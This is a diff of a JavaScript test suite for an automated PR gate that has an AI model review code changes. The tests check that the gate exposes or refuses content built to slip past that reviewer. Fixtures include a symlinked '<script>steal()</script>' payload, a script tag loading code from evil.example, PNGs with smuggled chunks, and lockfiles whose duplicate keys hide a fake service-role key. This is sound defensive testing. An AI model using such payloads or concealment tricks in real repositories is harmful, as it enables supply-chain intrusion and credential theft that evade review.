+    it("refuses a symlink or submodule anywhere in the change, end to end", async () => {
+      for (const link of ["pulsern/public/learn/example/index.html", "pulsern/src/evil.js"]) {
+        const dir = mkdtempSync(join(tmpdir(), "astra-link-"));
+        const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+        run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+        writeFileSync(join(dir, "keep"), "x"); run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+        mkdirSync(join(dir, "pulsern/reports/astra"), { recursive: true });
+        writeFileSync(join(dir, "pulsern/reports/astra/payload.html"), "<script>steal()</script>");
+        mkdirSync(join(dir, link, ".."), { recursive: true });
+        symlinkSync(relative(join(dir, link, ".."), join(dir, "pulsern/reports/astra/payload.html")), join(dir, link));
+        run("add", "-A"); run("commit", "-qm", "h");
+        expect(() => collectChanges("b", "HEAD", { cwd: dir }), link).toThrow(/symlink or submodule/);
+        let called = false;
+        const { report } = await runReview({ base: "b", head: "HEAD", outDir: mkdtempSync(join(tmpdir(), "astra-out-")), rulesPath: "CLAUDE.md", cwd: dir }, { callModel: async () => { called = true; return ok(); } });
+        expect(called).toBe(false);
+        expect(report.verdict).toBe("FAIL");
+        rmSync(dir, { recursive: true, force: true });
+      }
+    });
+
+    it("shows a mode change even in a compact page digest", () => {
+      const path = "pulsern/public/learn/z/index.html";
+      const dir = repoWith([[path, "<p>a</p>", "<p>b</p>"]]);
+      execFileSync("git", ["update-index", "--chmod=+x", path], { cwd: dir });
+      execFileSync("git", ["commit", "-qm", "x"], { cwd: dir });
+      const f = collectChanges("b", "HEAD", { cwd: dir }).files.find((x) => x.path === path);
+      expect(f.diff).toContain("mode 100644 → 100755");
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    /* Round 12: only new bytes must be canonical. An existing image from an
+       ordinary encoder can be replaced or deleted. */
+    it("lets a legacy image be replaced by a canonical one, or deleted", () => {
+      const path = "pulsern/public/shot.png";
+      let dir = repoWith([[path, libPng(3), PNG(4)]]);
+      let r = collectChanges("b", "HEAD", { cwd: dir });
+      expect(r.images.map((i) => i.side)).toEqual(["before", "after"]);
+      expect(r.images[0].bytes.equals(libPng(3))).toBe(true);
+      rmSync(dir, { recursive: true, force: true });
+
+      dir = repoWith([[path, libPng(3), "placeholder"]]);
+      execFileSync("git", ["rm", "-q", path], { cwd: dir });
+      execFileSync("git", ["commit", "-qm", "rm"], { cwd: dir });
+      r = collectChanges("b", "HEAD", { cwd: dir });
+      const f = r.files.find((x) => x.path === path);
+      expect(f.status).toBe("D");
+      expect(f.diff).toContain("+ (absent)");
+      rmSync(dir, { recursive: true, force: true });
+
+      // but new bytes must still be canonical
+      dir = repoWith([[path, libPng(3), libPng(4)]]);
+      expect(() => collectChanges("b", "HEAD", { cwd: dir })).toThrow(/cannot pass/);
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    it("accepts only the canonical PNG of the pixels, under its own extension", () => {
+      expect(reviewableImage("a/b.png", PNG(1))).toBe("image/png");
+      expect(reviewableImage("a/b.PNG", PNG(1))).toBe("image/png");
+      expect(reviewableImage("a/b.html", PNG(1))).toBeNull();
+      expect(reviewableImage("a/b.png", Buffer.concat([PNG(1), Buffer.from("x")]))).toBeNull();
+      const bad = PNG(1); bad[bad.length - 20] ^= 1;
+      expect(reviewableImage("a/b.png", bad)).toBeNull();
+      // a valid PNG from an ordinary encoder is refused until canonicalised
+      expect(reviewableImage("a/b.png", libPng(7))).toBeNull();
+      expect(canonicalPng(libPng(7)).equals(PNG(7))).toBe(true);
+      expect(reviewableImage("a/b.png", canonicalPng(libPng(7)))).toBe("image/png");
+      // even a harmless pixel-description chunk is refused: one file per image
+      expect(reviewableImage("a/b.png", withChunk(PNG(1), "pHYs", Buffer.from([0, 0, 11, 19, 0, 0, 11, 19, 1])))).toBeNull();
+      expect(reviewableImage("a/b.png", withChunk(PNG(1), "tEXt", secret))).toBeNull();
+      expect(reviewableImage("a/b.png", trailingIdat(1))).toBeNull();
+    });
+  });
+
+  it("is lossless: any byte that changes shows", () => {
+    for (const [a, b] of [["<p>Hi  there</p>", "<p>Hi there</p>"], ["<p>x</p>", "<p>x</p>\n"], ["<b>a</b>", "<b >a</b>"]]) {
+      expect(pageDigest(a), `${a} vs ${b}`).not.toBe(pageDigest(b));
+    }
+  });
+
+  /* PR #133 review, finding 3: a git dependency moved to another commit at
+     the same version, with no integrity field, was invisible. */
+  it("shows a git dependency moved to a different commit", () => {
+    const lock = (rev) => npmJson({ packages: { "": { name: "x" }, "node_modules/pkg": { version: "1.0.0", resolved: `git+ssh://git@github.com/org/pkg.git#${rev}` } } });
+    expect(textDiff(lockDigest(lock("aaaa1111")), lockDigest(lock("bbbb2222")), "package-lock.json")).toContain("bbbb2222");
+  });
+
+  /* Round 4: dev/optional flags decide whether npm installs a package
+     (and runs its install script) under --omit=dev. */
+  it.each([["dev", { dev: true }, {}], ["optional", { optional: true }, {}], ["devOptional", { devOptional: true }, {}]])(
+    "shows a change to the %s flag", (_, before, after) => {
+      const lock = (flags) => npmJson({ lockfileVersion: 3, packages: { "node_modules/p": { version: "1.0.0", hasInstallScript: true, ...flags } } });
+      expect(textDiff(lockDigest(lock(before)), lockDigest(lock(after)), "l")).not.toBe("");
+    });
+  it("shows a change to any top-level lockfile field", () => {
+    const a = npmJson({ lockfileVersion: 3, requires: true, packages: {} });
+    expect(textDiff(lockDigest(a), lockDigest(a.replace("true", "false")), "l")).not.toBe("");
+  });
+  it("is deterministic whatever order npm writes keys in", () => {
+    const a = npmJson({ packages: { "node_modules/p": { version: "1", dev: true } } });
+    const b = npmJson({ packages: { "node_modules/p": { dev: true, version: "1" } } });
+    expect(lockDigest(a)).toBe(lockDigest(b));
+  });
+
+  it("shows a changed integrity hash in full and a new install script", () => {
+    const lock = (integ, scripts) => npmJson({ packages: { "node_modules/p": { version: "1.0.0", resolved: "https://registry.npmjs.org/p/-/p-1.0.0.tgz", integrity: integ, ...(scripts ? { hasInstallScript: true } : {}) } } });
+    const a = "sha512-" + "A".repeat(80), b = "sha512-" + "A".repeat(60) + "B".repeat(20);
+    expect(textDiff(lockDigest(lock(a)), lockDigest(lock(b)), "l")).not.toBe("");
+    expect(textDiff(lockDigest(lock(a)), lockDigest(lock(a, true)), "l")).toContain("hasInstallScript");
+  });
+
+  /* Round 14: every unreadable version used to become the same constant
+     line, so two different files showed "no change". */
+  it("refuses a lockfile it cannot read instead of summarising it as a constant", () => {
+    for (const bad of ["{not json", "42", "\"text\"", "[]", "null", '{"packages": "x"}', '{"packages": []}']) {
+      expect(() => lockDigest(bad), bad).toThrow(/cannot pass/);
+    }
+  });
+  /* Round 15: JSON.parse keeps the last of two duplicate keys, so a
+     credential in the first one vanished from the summary. */
+  /* Round 16: "node_modules/" was stripped from keys, so moving an entry
+     between "p" and "node_modules/p" printed identically. */
+  it("keeps every package key exactly", () => {
+    const at = (key) => npmJson({ lockfileVersion: 3, packages: { "": { name: "x" }, [key]: { version: "1.0.0" } } });
+    expect(textDiff(lockDigest(at("node_modules/p")), lockDigest(at("p")), "l")).not.toBe("");
+    // a real key named like the old "(root)" alias can no longer collide with the root entry
+    expect(lockDigest(at("(root)"))).toContain('"(root)" {"version":"1.0.0"}');
+    expect(lockDigest(at("(root)"))).toContain('"" {"name":"x"}');
+  });
+  it("refuses a lockfile parsing would lose anything from", () => {
+    const good = JSON.stringify({ name: "pulsern", lockfileVersion: 3, packages: { "": { name: "pulsern" } } }, null, 2) + "\n";
+    expect(() => lockDigest(good)).not.toThrow();
+    const dup = good.replace('{\n  "name": "pulsern"', '{\n  "name": "SUPABASE_SERVICE_ROLE_KEY=eyJ.x",\n  "name": "pulsern"');
+    expect(JSON.parse(dup)).toEqual(JSON.parse(good));   // what JSON.parse sees is identical…
+    expect(() => lockDigest(dup)).toThrow(/cannot pass/);  // …so the file is refused
+    const nested = good.replace('"": {\n      "name": "pulsern"', '"": {\n      "name": "secret",\n      "name": "pulsern"');
+    expect(() => lockDigest(nested)).toThrow(/cannot pass/);
+    expect(() => lockDigest(good.replace("3", "3.0"))).toThrow(/cannot pass/);
+    expect(() => lockDigest(good.replace(/\n$/, ""))).toThrow(/cannot pass/);
+    expect(() => lockDigest(good.replace(/\n/g, "\r\n"))).toThrow(/cannot pass/);
+  });
+  it("accepts the repository's real lockfile", () => {
+    expect(() => lockDigest(readFileSync("package-lock.json", "utf8"))).not.toThrow();
+  });
+  it("summarises only PulseRN's own npm lockfile; any other of that name is plain text", () => {
+    expect(classifyPath("pulsern/package-lock.json").mode).toBe("lockfile");
+    expect(classifyPath("pulsern/public/package-lock.json").mode).toBe("review");
+  });
+  it("fails the review, end to end, on two different unparseable lockfiles", async () => {
+    const dir = mkdtempSync(join(tmpdir(), "astra-lock-"));
+    const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+    run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+    mkdirSync(join(dir, "pulsern"), { recursive: true });
+    writeFileSync(join(dir, "pulsern/package-lock.json"), "{broken one"); run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+    writeFileSync(join(dir, "pulsern/package-lock.json"), "{broken two SUPABASE_SERVICE_ROLE_KEY=x");
+    run("add", "-A"); run("commit", "-qm", "h");
+    let called = false;
+    const { report } = await runReview({ base: "b", head: "HEAD", outDir: mkdtempSync(join(tmpdir(), "astra-out-")), rulesPath: "CLAUDE.md", cwd: dir }, { callModel: async () => { called = true; return { text: JSON.stringify({ assessment: "ok", findings: [] }), usage: {} }; } });
+    expect(called).toBe(false);
+    expect(report.verdict).toBe("FAIL");
+    // and a file of that name elsewhere is shown in full
+    mkdirSync(join(dir, "pulsern/public"), { recursive: true });
+    writeFileSync(join(dir, "pulsern/public/package-lock.json"), "{broken SECRET=1");
+    run("add", "-A"); run("commit", "-qm", "p");
+    const f = collectChanges("HEAD~1", "HEAD", { cwd: dir }).files.find((x) => x.path === "pulsern/public/package-lock.json");
+    expect(f.form).toBe("diff");
+    expect(f.diff).toContain("SECRET=1");
+    rmSync(dir, { recursive: true, force: true });
   });
 
   it("produces no diff when nothing meaningful changed", () => {
@@ -235,20 +765,20 @@ describe("running a review end to end (Astra finding #5)", () => {
     const pending = runReview(opts(dir), { callModel: () => new Promise((r) => { release = r; }) });
     await new Promise((r) => setTimeout(r, 50));
     const md = readFileSync(join(dir, "2026-10-08-pr7-" + g("rev-parse", "HEAD").trim().slice(0, 7) + ".md"), "utf8");
-    expect(md).toContain("# Astra review — FAIL");
+    expect(md).toContain("# Luna review — FAIL");
     expect(md).toContain("did not finish");
-    release({ text: JSON.stringify({ assessment: "ok", findings: [] }), usage: { costUsd: 0.1 }, model: "openai/gpt-6-astra" });
+    release({ text: JSON.stringify({ assessment: "ok", findings: [] }), usage: { costUsd: 0.1 }, model: "openai/gpt-6-luna" });
     await pending;
   });
 
   it("replaces the checkpoint with the real verdict when the call completes", async () => {
     const dir = out();
-    const { code, report } = await runReview(opts(dir), { callModel: async () => ({ text: JSON.stringify({ assessment: "clean", findings: [] }), usage: { costUsd: 0.5 }, model: "openai/gpt-6-astra" }) });
+    const { code, report } = await runReview(opts(dir), { callModel: async () => ({ text: JSON.stringify({ assessment: "clean", findings: [] }), usage: { costUsd: 0.5 }, model: "openai/gpt-6-luna" }) });
     expect(code).toBe(0);
     expect(report.verdict).toBe("PASS");
     const [md] = readdirSync(dir).filter((f) => f.endsWith(".md"));
     const text = readFileSync(join(dir, md), "utf8");
-    expect(text).toContain("# Astra review — PASS");
+    expect(text).toContain("# Luna review — PASS");
     expect(text).not.toContain("did not finish");
   });
 
@@ -258,7 +788,7 @@ describe("running a review end to end (Astra finding #5)", () => {
     await runReview(opts(dir), { callModel: async (a) => { prompt = a.prompt; return { text: JSON.stringify({ assessment: "x", findings: [] }), usage: {}, model: "m" }; } });
     expect(prompt).toContain("pulsern/public/révision.html");
     expect(prompt).toContain("pulsern/public/learn/sneaky/index.html");
-    expect(prompt).toContain("+SCRIPT src=https://evil.example/x.js");
+    expect(prompt).toContain(`+TAG ${JSON.stringify('<script src="https://evil.example/x.js">')}`);
     expect(prompt).not.toContain("fullburn/x.js");
   });
 
@@ -279,13 +809,13 @@ describe("running a review end to end (Astra finding #5)", () => {
 
 describe("the saved report", () => {
   const base = {
-    model: "openai/gpt-6-astra", mode: "trusted", meta: { base: "a".repeat(40), head: "b".repeat(40), pr: "12" },
+    model: "openai/gpt-6-luna", mode: "trusted", meta: { base: "a".repeat(40), head: "b".repeat(40), pr: "12" },
     reviewedAt: "2026-10-08T20:00:00.000Z", filesReviewed: ["pulsern/src/x.js"], skipped: [],
     usage: { costUsd: 0.4123, promptTokens: 30000, completionTokens: 2000 },
   };
   it("leads with the verdict and records the cost", () => {
     const md = renderMarkdown({ ...base, verdict: "FAIL", counts: { blocker: 1, major: 0, minor: 0 }, assessment: "a", findings: [finding("blocker")] });
-    expect(md.split("\n")[0]).toBe("# Astra review — FAIL");
+    expect(md.split("\n")[0]).toBe("# Luna review — FAIL");
     expect(md).toContain("$0.4123");
   });
   it("says the change was read as data by the trusted reviewer", () => {
